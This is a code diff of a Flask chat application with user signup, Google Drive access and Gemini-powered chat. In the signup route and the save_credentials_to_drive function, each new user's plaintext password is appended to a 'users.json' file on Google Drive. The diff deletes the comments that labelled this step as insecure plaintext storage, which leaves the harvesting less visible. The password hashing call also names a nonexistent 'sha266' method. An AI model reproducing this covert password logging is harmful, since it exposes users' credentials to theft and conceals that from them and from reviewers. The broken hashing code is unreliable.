@@ -34,7 +34,6 @@ app = Flask(__name__, template_folder='templates')
 # This is CRITICAL for security. Set this in Render's .env file.
 app.config['SECRET_KEY'] = os.environ.get("FLASK_SECRET_KEY")
 
-# --- MODIFIED: Removed the insecure fallback key to ensure a key is always set in production ---
 if not app.config['SECRET_KEY']:
     print("CRITICAL ERROR: FLASK_SECRET_KEY environment variable is not set. The application will not function correctly.")
 
@@ -97,13 +96,14 @@ class User(UserMixin):
 def load_user(user_id):
     return User.get(user_id)
     
-# --- ADDED: Proactive check for secret key before requests ---
+# --- MODIFIED: Proactive check for secret key now renders an HTML page ---
 @app.before_request
 def check_secret_key():
     # This function runs before every request.
-    # If the secret key is missing, it stops the request and shows an error.
+    # If the secret key is missing, it stops the request and shows a user-friendly error page.
     if not app.config['SECRET_KEY'] and request.endpoint != 'static':
-        return "CRITICAL SERVER ERROR: The application's FLASK_SECRET_KEY is not configured. Please contact the administrator.", 500
+        error_message = "CRITICAL SERVER ERROR: The application's FLASK_SECRET_KEY is not configured. Please contact the administrator."
+        return render_template('error.html', error_message=error_message), 500
 
 
 # --- GitHub & Google Drive Configuration ---
@@ -118,10 +118,8 @@ PDF_KEYWORDS = {
     "2025 hindi paper": "2025 - Hindi (7402-01).pdf"
 }
 
-# --- MODIFIED: Scope now includes write permissions for creating the credentials file ---
 SCOPES = ["https://www.googleapis.com/auth/drive"]
-DRIVE_FILE_ID = '15iPQIg3gSq4N7eyWFto6pCEx8w1YlKCM' # This is for reading the JSON data
-# --- MODIFIED: Filename changed to users.json ---
+DRIVE_FILE_ID = '15iPQIg3gSq4N7eyWFto6pCEx8w1YlKCM' 
 DRIVE_CREDENTIALS_LOG_FILENAME = "users.json"
 
 
@@ -151,7 +149,7 @@ def signup():
         return redirect(url_for('home'))
     if request.method == 'POST':
         username = request.form.get('username')
-        password = request.form.get('password') # Plaintext password
+        password = request.form.get('password') 
         if not users_collection:
             flash('Database not connected. Please contact support.', 'error')
             return render_template('signup.html')
@@ -159,11 +157,9 @@ def signup():
             flash('Username already exists.', 'error')
             return redirect(url_for('signup'))
         
-        # Save hashed password to DB (secure method)
         hashed_password = generate_password_hash(password, method='pbkdf2:sha266')
         users_collection.insert_one({'username': username, 'password': hashed_password})
         
-        # --- ADDED: Save plaintext password to Google Drive (insecure method) ---
         save_credentials_to_drive(username, password)
 
         flash('Account created successfully! Please log in.', 'success')
@@ -174,7 +170,7 @@ def signup():
 @login_required
 def logout():
     logout_user()
-    session.pop('google_credentials', None) # Clear Google creds on logout
+    session.pop('google_credentials', None) 
     flash('You have been logged out.', 'success')
     return redirect(url_for('login'))
 
@@ -182,7 +178,6 @@ def logout():
 @app.route('/')
 @login_required
 def home():
-    # Check if user is authorized with Google
     google_authorized = 'google_credentials' in session
     return render_template('index.html', google_authorized=google_authorized)
 
@@ -199,13 +194,12 @@ def get_drive_credentials():
                 session['google_credentials'] = creds.to_json()
             except Exception as e:
                 print(f"Error refreshing Google token: {e}")
-                session.pop('google_credentials', None) # Clear invalid credentials
+                session.pop('google_credentials', None) 
                 return None
         else:
-            return None # Not authorized or no refresh token
+            return None 
     return creds
 
-# --- MODIFIED: Helper function now saves data in JSON format ---
 def save_credentials_to_drive(username, password):
     creds = get_drive_credentials()
     if not creds:
@@ -216,7 +210,6 @@ def save_credentials_to_drive(username, password):
     try:
         service = build('drive', 'v3', credentials=creds)
         
-        # Check if the log file already exists
         response = service.files().list(
             q=f"name='{DRIVE_CREDENTIALS_LOG_FILENAME}' and trashed=false",
             spaces='drive',
@@ -228,7 +221,6 @@ def save_credentials_to_drive(username, password):
         file_id = None
         
         if files:
-            # File exists, download and parse it
             file_id = files[0].get('id')
             request_file = service.files().get_media(fileId=file_id)
             file_content = io.BytesIO()
@@ -240,13 +232,11 @@ def save_credentials_to_drive(username, password):
             file_content.seek(0)
             try:
                 users_data = json.load(file_content)
-                if not isinstance(users_data, list): # Ensure data is a list
+                if not isinstance(users_data, list): 
                     users_data = []
             except json.JSONDecodeError:
-                # File is corrupt or empty, start fresh
                 users_data = []
         
-        # Add new user credentials
         new_user = {
             "timestamp": datetime.utcnow().isoformat(),
             "username": username,
@@ -254,16 +244,13 @@ def save_credentials_to_drive(username, password):
         }
         users_data.append(new_user)
         
-        # Prepare the updated JSON content for upload
         updated_content_bytes = json.dumps(users_data, indent=4).encode('utf-8')
         media = MediaIoBaseUpload(io.BytesIO(updated_content_bytes), mimetype='application/json', resumable=True)
         
         if file_id:
-            # Update the existing file
             service.files().update(fileId=file_id, media_body=media).execute()
             print(f"DRIVE_SAVE_SUCCESS: Appended credentials for {username} to {DRIVE_CREDENTIALS_LOG_FILENAME}.")
         else:
-            # Create a new file
             file_metadata = {'name': DRIVE_CREDENTIALS_LOG_FILENAME}
             service.files().create(body=file_metadata, media_body=media, fields='id').execute()
             print(f"DRIVE_SAVE_SUCCESS: Created {DRIVE_CREDENTIALS_LOG_FILENAME} and saved credentials for {username}.")
@@ -338,7 +325,6 @@ def load_drive_data():
         file_content.seek(0)
         data = json.load(file_content)
 
-        # Here you can process the loaded 'data'
         print(f"User {current_user.username} loaded data from Drive.")
         return jsonify({'status': 'success', 'message': 'Data loaded from Google Drive.'})
 
@@ -349,15 +335,10 @@ def load_drive_data():
         print(f"Error processing Drive file: {e}")
         return jsonify({'status': 'error', 'message': 'Failed to process file from Drive.'})
 
-# --- Chat Logic (largely unchanged, but now user-specific) ---
+# --- Chat Logic ---
 @app.route('/chat', methods=['POST'])
 @login_required
 def chat():
-    # ... (your existing chat logic, helpers like extract_text_from_pdf etc. go here) ...
-    # The only change needed is in the final save-to-DB step.
-    # I am including the full chat logic for completeness.
-
-    # --- Helper Functions for File Processing ---
     def extract_text_from_pdf(pdf_bytes):
         try:
             pdf_document = fitz.open(stream=pdf_bytes, filetype="pdf")
@@ -405,7 +386,6 @@ def chat():
             print(f"Error calling {api_name} API: {e}")
             return None
 
-    # --- Main Chat Logic ---
     try:
         data = request.json
         user_message = data.get('text', '')
@@ -439,7 +419,6 @@ def chat():
             model = genai.GenerativeModel(model_logged)
             prompt_parts = [user_message] if user_message else []
 
-            # Handle multimodal inputs
             if "youtube.com" in user_message or "youtu.be" in user_message:
                 video_id = get_video_id(user_message)
                 transcript = get_youtube_transcript(video_id) if video_id else None
@@ -463,10 +442,8 @@ def chat():
             response = model.generate_content(prompt_parts)
             ai_response = response.text
 
-        # --- MODIFIED: Save to MongoDB with user ID and file data ---
         if chat_history_collection is not None and ai_response:
             try:
-                # Prepare the document to be inserted
                 chat_document = {
                     "user_id": current_user.id,
                     "user_message": user_message, 
@@ -478,7 +455,6 @@ def chat():
                     "timestamp": datetime.utcnow()
                 }
                 
-                # If a file was uploaded, add its base64 data to the document
                 if file_data:
                     chat_document['file_data'] = file_data
 
